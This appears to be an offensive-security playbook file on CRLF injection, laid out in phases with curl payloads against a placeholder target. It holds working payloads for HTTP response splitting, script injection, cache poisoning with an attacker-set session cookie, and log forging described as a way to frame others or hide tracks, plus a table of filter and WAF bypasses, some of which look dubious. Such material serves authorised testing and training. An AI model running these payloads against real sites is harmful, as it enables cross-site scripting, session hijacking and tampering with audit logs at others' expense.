---
name: crlf-injection
description: CRLF (Carriage Return Line Feed) injection — HTTP response splitting, log injection, header injection
category: vulnerabilities
---

# CRLF Injection

> Inject newlines into HTTP headers or response bodies to split responses, poison caches, or inject XSS.

## What It Is
CRLF Injection occurs when user input is reflected in HTTP headers without stripping `\r\n` (%0d%0a). Attackers can inject arbitrary headers or response bodies.

## Attack Surface
- Redirect URLs (Location header)
- Log fields (User-Agent, Referer)
- Custom headers reflecting input
- Cookie values

## PHASE 1 — Discovery
```bash
# Basic CRLF test
curl -s "https://target.com/page?redirect=%0d%0aX-CRLF-Test:injected"

# Check response headers
curl -sI "https://target.com/page?redirect=%0d%0aX-CRLF-Test:injected"

# Response splitting
curl -s "https://target.com/page?param=%0d%0aHTTP/1.1%20200%20OK%0d%0a%0d%0a<html>injected</html>"
```

## PHASE 2 — Common Injection Points
```
URL parameters in redirects:  /redirect?url=PAYLOAD
Referer header logged:        Referer: PAYLOAD
User-Agent logged:            User-Agent: PAYLOAD
Cookie values:                Cookie: session=PAYLOAD
Form input in headers:        Search results in Set-Cookie
```

## PHASE 3 — XSS via CRLF
```bash
# Inject XSS through response splitting
curl "https://target.com/page?cb=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>"
```

## PHASE 4 — Cache Poisoning via CRLF
```bash
# Inject headers that cache proxy stores
curl "https://target.com/page?cb=%0d%0aSet-Cookie:%20session=attacker-controlled"
```

## PHASE 5 — Log Injection
```bash
# Inject fake log entries
curl -s "https://target.com/" -H "User-Agent: admin%0d%0aLogin%20Success:%20admin"

# Attacker can forge log entries to frame others or hide tracks
```

## Bypass Techniques
| Filter | Bypass |
|--------|--------|
| Blocked `\r\n` | `%0d%0a` |
| Blocked `%0d%0a` | `%0d%0a%0d%0a` (double) |
| Blocked `\r\n` | `\r\n` URL-encoded inside a param |
| WAF blocks `%0d` | `%0a%0d` (reversed) |
| Blocks newlines | Unicode variants |

## Tools
- **crlfuzz**: `crlfuzz -u "https://target.com/page?cb=FUZZ"`
- **CRLFsuite**: `crlfsuite -u "https://target.com/page?cb=FUZZ"`
- **Nuclei**: `nuclei -t vulnerabilities/ -tags crlf`
- **Burp**: Repeater + manual CRLF injection
